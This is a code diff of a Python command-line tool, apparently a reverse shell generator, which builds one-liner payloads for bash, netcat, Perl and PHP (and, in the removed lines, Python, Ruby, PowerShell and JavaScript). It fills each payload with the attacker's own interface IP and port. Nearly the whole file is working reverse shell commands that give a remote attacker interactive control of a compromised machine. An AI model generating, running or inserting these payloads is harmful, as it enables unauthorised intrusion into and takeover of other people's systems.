@@ -1,99 +1,116 @@
 #!/usr/bin/python3
 
-from printy import printy
+from sys import exit
 import argparse
 import netifaces
-import pyperclip
+
+revshells = [
+    {
+        "language": "bash",
+        "payloads": [
+            {
+                "description": "Bash TCP",
+                "command": "bash -c 'bash -i >& /dev/tcp/-ip-/-port- 0>&1'"
+            },{
+                "description": "Bash 196",
+                "command": "0<&196;exec 196<>/dev/tcp/-ip-/-port-; bash <&196 >&196 2>&196"
+            },{
+                "description": "Bash read line",
+                "command": "exec 5<>/dev/tcp/-ip-/-port-;cat <&5 | while read line; do $line 2>&5 >&5; done"
+            },{
+                "description": "Bash 5",
+                "command": "bash -i 5<> /dev/tcp/-ip-/-port- 0<&5 1>&5 2>&5"
+            }
+        ]
+    },{
+        "language": "nc",
+        "payloads": [
+            {
+                "description": "nc mkfifo",
+                "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc -ip- -port- >/tmp/f"
+            },{
+                "description": "nc -e",
+                "command": "nc -e sh -ip- -port-"
+            },{
+                "description": "nc -c",
+                "command": "nc -c sh -ip- -port-"
+            }
+        ]
+    },{
+        "language": "perl",
+        "payloads": [
+            {
+                "description": "Perl",
+                "command": """perl -e 'use Socket;$i="-ip-";$p=-port-;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'"""
+            },{
+                "description": "Perl no sh",
+                "command": """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"-ip-:-port-");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
+            }
+        ]
+    },{
+        "language": "php",
+        "payloads": [
+            {
+                "description": "PHP system",
+                "command": """php -r '$sock=fsockopen("-ip-",-port-);system("bash <&3 >&3 2>&3");'"""
+            },{
+                "description": "PHP `",
+                "command": """php -r '$sock=fsockopen("-ip-",-port-);`bash <&3 >&3 2>&3`;'"""
+            },{
+                "description": "PHP popen",
+                "command": """php -r '$sock=fsockopen("-ip-",-port-);popen("bash <&3 >&3 2>&3", "r");'"""
+            },{
+                "description": "PHP passthru",
+                "command": """php -r '$sock=fsockopen("-ip-",-port-);passthru("bash <&3 >&3 2>&3", "r");'"""
+            },{
+                "description": "PHP shell_exec",
+                "command": """php -r '$sock=fsockopen("-ip-",-port-);shell_exec("bash <&3 >&3 2>&3", "r");'"""
+            },{
+                "description": "PHP popen",
+                "command": """php -r '$sock=fsockopen("-ip-",-port-);exec("bash <&3 >&3 2>&3", "r");'"""
+            },{
+                "description": "PHP proc_open",
+                "command": """php -r '$sock=fsockopen("-ip-",-port-);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
+            }
+        ]
+    }
+]
+
+def get_languages():
+    return ','.join(map(str, list(map(lambda x: x["language"],revshells))))
 
 def get_parser():
-    parser = argparse.ArgumentParser(description="Generates a reverse shell command for the specified subsystem")
+    parser = argparse.ArgumentParser(description="Generates reverse shell commands for the specified language")
     parser.add_argument("-p","--port",action="store", dest="port",default=443, type=int, help="Specifies the port to open the connection in")
-    parser.add_argument("-H","--hexadecimal",action="store_true",dest="hexadecimal",default=False, help="Encode the ip in hexadecimal")
-    parser.add_argument("-S","--list-subsystems",action="store_true", dest="list_subsystems",default=False, help="List available subsystems")    
-    parser.add_argument("-s","--subsystem",action="store", dest="subsystem",default="bash", help="What subsystem the reverse shell is going to execute")
+    parser.add_argument("-i","--interface",action="store", dest="interface",default="eth0", help="Specifies the port to open the connection in")
+    parser.add_argument("-l","--language",action="store", dest="language",default="bash", help=f"""Reverse shell language [{get_languages()}]""")
     return parser
 
-def print_banner():
-    banner = """
-__________                        _________.__           .__  .__   
-\______   \ _______  __          /   _____/|  |__   ____ |  | |  |  
- |       _// __ \  \/ /  ______  \_____  \ |  |  \_/ __ \|  | |  |  
- |    |   \  ___/\   /  /_____/  /        \|   Y  \  ___/|  |_|  |__
- |____|_  /\___  >\_/           /_______  /|___|  /\___  >____/____/
-        \/     \/                       \/      \/     \/           
-"""
-    printy(banner,"y>")
+def get_revshells(language,ip,port):
+    result = ""
+    payloads = next(item for item in revshells if item["language"] == language)
+    for payload in payloads["payloads"]:
+        result += "{:<20s} {:s}\n".format(payload["description"],payload["command"]).replace("-ip-",str(ip)).replace("-port-",str(port))
+    return result
 
-def get_subsystems():
-    return ["bash","nc","python","powershell","php","perl","ruby"]
+def ip_from_iface(iface):
+    try:
+        ip = netifaces.ifaddresses(iface).get(2)[0]["addr"]
+        return ip
+    except ValueError:
+        exit(1)
 
-def get_revshell(subsystem,ip,port):
-    if subsystem.lower() == "bash":
-        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
-    elif subsystem.lower() == "perl":
-        return f"perl -e \"use Socket;$i='{ip}';$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};\""
-    elif subsystem.lower() == "python":
-        return f"python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\""
-    elif subsystem.lower() == "php":
-        return f"php -r \"$sock=fsockopen({ip},{port});exec('/bin/sh -i <&3 >&3 2>&3');\""
-    elif subsystem.lower() == "ruby":
-        return f"ruby -rsocket -e\"f=TCPSocket.open({ip},{port}).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)\""
-    elif subsystem.lower() == "powershell":
-        return f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
-    elif subsystem.lower() == "nc":
-        return f"nc -e /bin/sh {ip} {port}"
-    elif subsystem.lower() == "js":
-        return f"""var host="{ip}"; var port={port}; var cmd="/bin/bash"; var p=new java.lang.ProcessBuilder(cmd, "-i").redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while( pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'""""
-        # return f"""var host="{ip}"; var port={port}; var cmd='cmd.exe'; var p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while( pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {{p.exitValue();break;}}catch (e){{ }} }};p.destroy();s.close();"""
-    else:
-        return None
-
-def list_node(style):
-    return f"[r][{style}] "
-
-def list_subsystems():
-    subsystems = get_subsystems()
-    for item in subsystems:
-        printy(list_node("+"),end="")
-        printy(item,"c")
-
-def is_localhost(ip):
-    return ip == '127.0.0.1'
-
-def iptohex(ip):
-    hex_ip = ""
-    for octet in ip.split("."):
-        hex_ip = hex_ip + hex(int(octet))
-    return hex_ip
-
-def menu():
-    i = 1
-    ifaces = []
-    for iface in netifaces.interfaces():
-        iface_info = netifaces.ifaddresses(iface).get(2)
-        if iface_info and not is_localhost(iface_info[0]['addr']):
-            ifaces = ifaces + [iface_info[0]]
-            printy(list_node(i),end="") 
-            print(f"{iface}: {iface_info[0]['addr']}")
-            i = i+1
-    return ifaces
+def check_language(language):
+    if language not in get_languages():
+        exit(2)
 
 def app():
     parser = get_parser()
     args = parser.parse_args()
-    print_banner()
-    if(args.list_subsystems):
-        list_subsystems()
-        return
-    if(args.subsystem):
-        ifaces = menu()
-        option = int(input("Choose what interfaces to use: "))
-        if(args.hexadecimal):
-            ip = iptohex(ifaces[option - 1]['addr'])
-        else:
-            ip = ifaces[option - 1]['addr']    
-        revshell = get_revshell(args.subsystem,ip,args.port)
-        pyperclip.copy(revshell)
-        printy(revshell,'c')
+    ip = ip_from_iface(args.interface)
+    check_language(args.language)
+    revshells = get_revshells(args.language,ip,args.port)
+    print(revshells)
 
-app()
+if __name__ == "__main__":
+    app()
